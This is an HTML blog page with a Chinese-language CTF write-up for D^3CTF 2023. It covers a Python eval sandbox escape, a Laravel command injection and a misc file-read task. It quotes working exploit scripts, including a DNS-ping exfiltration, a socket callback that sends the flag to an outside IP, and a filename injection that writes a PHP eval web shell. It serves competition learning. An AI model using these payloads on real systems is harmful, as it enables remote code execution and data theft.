@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>D^3ctf 2023 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/ctf/d3ctf-2023/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="D^3ctf 2023">
+  <meta property="og:description" content="web EscapePlan 源码是ban了很多字符和关键字
+black_char = [ &#34;&#39;&#34;, &#39;&#34;&#39;, &#39;.&#39;, &#39;,&#39;, &#39; &#39;, &#39;&#43;&#39;, &#39;__&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;str&#39;, &#39;import&#39;, &#39;except&#39;, &#39;if&#39;, &#39;for&#39;, &#39;while&#39;, &#39;pass&#39;, &#39;with&#39;, &#39;assert&#39;, &#39;break&#39;, &#39;class&#39;, &#39;raise&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, ] for char in black_char: if char in cmd: return f&#39;failed: `{char}`&#39; msg = &#34;success&#34; try: eval(cmd) except Exception: msg = &#34;error&#34; 关于python的一些trick，记录一下,可以通过len() int()函数等拿到数字
+例如：
+int(len(black_char)) == 31 int(char) == 9 int(black_char[len(black_char)-int(char)]) == 1 可以利用black_char下标拿到任何黑名单 len([]) == 0 len(black_char[len([])]) ==1 int(False)==0 ~int(False)==-1 -~int(False)==1 &lt;&lt; 是一个位移运算符，用于将一个操作数的二进制表示向左移动指定的位数 &lt;&lt; 1 相当于 乘以2的1次方 | 是一个按位或运算符 5|6 == 7 亚军的exp，用的repr(request) 自己这里打不通">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T23:51:36+08:00">
+    <meta property="article:modified_time" content="2024-08-20T23:51:36+08:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="D^3ctf 2023">
+  <meta name="twitter:description" content="web EscapePlan 源码是ban了很多字符和关键字
+black_char = [ &#34;&#39;&#34;, &#39;&#34;&#39;, &#39;.&#39;, &#39;,&#39;, &#39; &#39;, &#39;&#43;&#39;, &#39;__&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;str&#39;, &#39;import&#39;, &#39;except&#39;, &#39;if&#39;, &#39;for&#39;, &#39;while&#39;, &#39;pass&#39;, &#39;with&#39;, &#39;assert&#39;, &#39;break&#39;, &#39;class&#39;, &#39;raise&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, ] for char in black_char: if char in cmd: return f&#39;failed: `{char}`&#39; msg = &#34;success&#34; try: eval(cmd) except Exception: msg = &#34;error&#34; 关于python的一些trick，记录一下,可以通过len() int()函数等拿到数字
+例如：
+int(len(black_char)) == 31 int(char) == 9 int(black_char[len(black_char)-int(char)]) == 1 可以利用black_char下标拿到任何黑名单 len([]) == 0 len(black_char[len([])]) ==1 int(False)==0 ~int(False)==-1 -~int(False)==1 &lt;&lt; 是一个位移运算符，用于将一个操作数的二进制表示向左移动指定的位数 &lt;&lt; 1 相当于 乘以2的1次方 | 是一个按位或运算符 5|6 == 7 亚军的exp，用的repr(request) 自己这里打不通">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/ctf/d3ctf-2023/" /><link rel="prev" href="https://thnpkm.github.io/posts/ctf/das-x-su/" /><link rel="next" href="https://thnpkm.github.io/posts/ctf/ciscn2023%E5%88%9D%E8%B5%9B/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "D^3ctf 2023",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/ctf\/d3ctf-2023\/"
+        },"genre": "posts","keywords": "","wordcount":  444 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/ctf\/d3ctf-2023\/","datePublished": "2024-08-20T23:51:36+08:00","dateModified": "2024-08-20T23:51:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">D^3ctf 2023</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;444 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#escapeplan">EscapePlan</a></li>
+    <li><a href="#d3cloud">d3cloud</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#d3readfile">d3readfile</a></li>
+    <li><a href="#heading"></a></li>
+    <li><a href="#d3gif">d3gif</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="web">web</h1>
+<h2 id="escapeplan">EscapePlan</h2>
+<p>源码是ban了很多字符和关键字</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>black_char <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#e6db74">&#39;,&#39;</span>, <span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;+&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;__&#39;</span>, <span style="color:#e6db74">&#39;exec&#39;</span>, <span style="color:#e6db74">&#39;eval&#39;</span>, <span style="color:#e6db74">&#39;str&#39;</span>, <span style="color:#e6db74">&#39;import&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;except&#39;</span>, <span style="color:#e6db74">&#39;if&#39;</span>, <span style="color:#e6db74">&#39;for&#39;</span>, <span style="color:#e6db74">&#39;while&#39;</span>, <span style="color:#e6db74">&#39;pass&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;with&#39;</span>, <span style="color:#e6db74">&#39;assert&#39;</span>, <span style="color:#e6db74">&#39;break&#39;</span>, <span style="color:#e6db74">&#39;class&#39;</span>, <span style="color:#e6db74">&#39;raise&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>, <span style="color:#e6db74">&#39;4&#39;</span>, <span style="color:#e6db74">&#39;5&#39;</span>, <span style="color:#e6db74">&#39;6&#39;</span>, <span style="color:#e6db74">&#39;7&#39;</span>, <span style="color:#e6db74">&#39;8&#39;</span>, <span style="color:#e6db74">&#39;9&#39;</span>,
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> black_char:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> char <span style="color:#f92672">in</span> cmd:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;failed: `</span><span style="color:#e6db74">{</span>char<span style="color:#e6db74">}</span><span style="color:#e6db74">`&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;success&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        eval(cmd)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;error&#34;</span>
+</span></span></code></pre></div><p>关于python的一些trick，记录一下,可以通过len() int()函数等拿到数字</p>
+<p>例如：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>int(len(black_char)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">31</span>
+</span></span><span style="display:flex;"><span>int(char) <span style="color:#f92672">==</span> <span style="color:#ae81ff">9</span>
+</span></span><span style="display:flex;"><span>int(black_char[len(black_char)<span style="color:#f92672">-</span>int(char)]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>可以利用black_char下标拿到任何黑名单
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>len([]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>len(black_char[len([])]) <span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>int(<span style="color:#66d9ef">False</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">~</span>int(<span style="color:#66d9ef">False</span>)<span style="color:#f92672">==-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-~</span>int(<span style="color:#66d9ef">False</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;&lt;</span> 是一个位移运算符<span style="color:#960050;background-color:#1e0010">，</span>用于将一个操作数的二进制表示向左移动指定的位数
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span> 相当于 乘以2的1次方
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> 是一个按位或运算符
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span><span style="color:#f92672">|</span><span style="color:#ae81ff">6</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">7</span>
+</span></span></code></pre></div><p>亚军的exp，用的repr(request) 自己这里打不通</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>shell<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ping -c 1 `/readflag`.c17fafb7.dns.dnsmap.org&#39;</span>
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> shell:
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;chr(&#34;</span><span style="color:#f92672">+</span>str(ord(i))<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;)+&#34;</span>
+</span></span><span style="display:flex;"><span>print(s[<span style="color:#ae81ff">0</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;__import__(&#39;os&#39;).popen(</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">)&#34;</span><span style="color:#f92672">.</span>format(s[<span style="color:#ae81ff">0</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ᵉxec(repr(request)[(len(black_char[len([])])&lt;&lt;(len(black_char[len([])])))|(len(black_char[len([])])&lt;&lt;(len(black_char[len([])])&lt;&lt;len(black_char[len([])])))|(len(black_char[len([])])&lt;&lt;(len(black_char[len([])])&lt;&lt;len(black_char[len([])])&lt;&lt;len(black_char[len([])])|len(black_char[len([])]))):len(repr(request))-int(black_char[len(black_char)-len(black_char[len([])])])])&#34;</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;cmd&#34;</span>: base64<span style="color:#f92672">.</span>b64encode(payload1<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)}
+</span></span><span style="display:flex;"><span>url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://47.102.115.18:30634/?&#39;</span><span style="color:#f92672">+</span>payload
+</span></span><span style="display:flex;"><span>response<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url,data<span style="color:#f92672">=</span>data)
+</span></span><span style="display:flex;"><span>print(response<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><p>看一下官方题解，是构造 这样的payload，原理并没解释</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>u <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫&#39;</span>
+</span></span><span style="display:flex;"><span>exp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;__import__(&#34;os&#34;).system(&#34;sleep 5&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>exp_m <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;ᵉval(vars(ᵉval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(</span><span style="color:#e6db74">{</span>base64<span style="color:#f92672">.</span>b64encode((exp<span style="color:#f92672">+</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">3</span><span style="color:#f92672">-</span>len(exp)<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>))<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">=()))[len([])]))&#34;</span>
+</span></span><span style="display:flex;"><span>exp_m <span style="color:#f92672">=</span> exp_m<span style="color:#f92672">.</span>translate({ord(str(i)): u[i] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>)}) <span style="color:#75715e">#将数字换成Unicode编码的数字</span>
+</span></span></code></pre></div><p>所以自己来分析一下</p>
+<pre tabindex="0"><code>_a_aiamapaoarata_a_ 看起来挺乱的，但是我们用切片把步长换为2时，就会发现
+&#39;_a_aiamapaoarata_a_&#39;[::2]  // 	__import__
+就是这个原理，通过dict()创建字典的方式和len([])取0下标的方式拿到字符和切片步长2
+list(dict(_a_aiamapaoarata_a_=()))[len([])] // _a_aiamapaoarata_a_
+len(list(dict(aa=()))[len([])]) // 2
+</code></pre><p>那么通过这个方式，这个exp_m拿到大致是 哈哈哈还是挺抽象，问了ai</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ᵉval(vars(ᵉval(__import__)(binascii))[a2b_base64](X19pbXBvcnRfXygib3MiKS5zeXN0ZW0oInNsZWVwIDUiKSAg))
+</span></span></code></pre></div><p>在这个表达式中，首先执行了第1步中的<code>__import__()</code>函数，导入了binascii模块；然后执行了第2步中的<code>vars()</code>函数，获取了binascii模块中的所有属性和值；接着执行了第3步中的a2b_base64()函数，将其作用域限定在当前作用域内；最后执行了第4步中的X19pbXBvcnRfXygib3MiKS5zeXN0ZW0oInNsZWVwIDUiKSAg字符串，将其转换为二进制数据块。最终，<code>eval()</code>函数返回的就是这个二进制数据块的处理结果。</p>
+<p>山海关战队就是用的这种exp，引用一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests<span style="color:#f92672">,</span> base64
+</span></span><span style="display:flex;"><span>u <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫&#39;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;&#34;__import__(&#39;os&#39;).popen(&#34;python -c &#39;import socket, os; flag = 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">os.popen(</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;/readflag</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;).read().encode();host = </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;43.143.195.203</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;;port=1337;s = 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((host, 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">port));s.sendall(flag);s.close();a=1;&#39;&#34;).read()&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> str(base64<span style="color:#f92672">.</span>b64encode(payload))<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#39;b&#39;</span>)<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;&#39;&#34;</span>) <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;=&#34;</span>
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span><span style="display:flex;"><span>CMD <span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;ᵉval(vars(ᵉval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dic</span>
+</span></span><span style="display:flex;"><span>t(b_i_n_a_s_c_i_i_<span style="color:#f92672">=</span>()))[len([])][::len(list(dict(aa<span style="color:#f92672">=</span>()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4<span style="color:#f92672">=</span>(
+</span></span><span style="display:flex;"><span>)))[len([])][::len(list(dict(aa<span style="color:#f92672">=</span>()))[len([])])]](list(dict({}()))[len([])]))<span style="color:#e6db74">&#34;.format(payload)</span>
+</span></span><span style="display:flex;"><span>CMD <span style="color:#f92672">=</span> CMD<span style="color:#f92672">.</span>translate({ord(str(i)): u[i] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>)})
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;http://106.14.124.130:31405/&#34;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;cmd&#34;</span>: base64<span style="color:#f92672">.</span>b64encode(CMD<span style="color:#f92672">.</span>encode())})<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>print(r)
+</span></span></code></pre></div><p>这题还是后面多看看其他师傅的思路，应该还能学到不少</p>
+<h2 id="d3cloud">d3cloud</h2>
+<p><strong>Laravel框架</strong></p>
+<p>后台/admin</p>
+<p>admin admin 直接登录进后台</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202305072024760.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202305072024760.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202305072024760.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202305072024760.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202305072024760.png"
+        title="image-20230507202451700" /></p>
+<p>泄露出文件管理的源码，考点就是需要审一些这个代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> ($file<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getClientOriginalExtension</span>() <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;zip&#34;</span>) {
+</span></span><span style="display:flex;"><span>            $fs <span style="color:#f92672">=</span> <span style="color:#a6e22e">popen</span>(<span style="color:#e6db74">&#34;unzip -oq &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">driver</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getAdapter</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getPathPrefix</span>() <span style="color:#f92672">.</span> $name <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; -d &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">driver</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getAdapter</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getPathPrefix</span>(), <span style="color:#e6db74">&#34;w&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">pclose</span>($fs);
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>危险代码是在这里，至于怎么在很多行代码里找到危险代码的，可能还是经验和代码审计的能力，也可以去找这个框架的源码，进行对比。</p>
+<p>这段代码</p>
+<pre tabindex="0"><code>$file-&gt;getClientOriginalExtension() 检查后缀
+$this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix()获取路径前缀以及要解压缩的文件名（可控）
+如果是zip，则使用popen()函数打开一个新进程，其中包含unzip命令。-o选项告诉unzip覆盖现有文件
+-d选项指定要将提取的文件写入的目录
+ pclose($fs); 关闭进程
+</code></pre><p>利用文件名写入shell</p>
+<pre tabindex="0"><code>1123.zip || echo PD9waHAgZXZhbCgkX1JFUVVFU1RbInNoZWxsIl0pOw== | base64 -d &gt;
+shell.php # .zip
+</code></pre><p>环境没了。。悲</p>
+<h1 id="misc">misc</h1>
+<h2 id="d3readfile">d3readfile</h2>
+<p>/var/cache/locate/locatedb 文件是 Linux 系统中“mlocate”工具所创建的文件，它包含系统上所有文件的一个索引，可以被用于在文件系统中搜索特定的文件名</p>
+<p>积累上吧</p>
+<p>查找被藏起来的flag</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202305091520407.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202305091520407.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202305091520407.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202305091520407.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202305091520407.png"
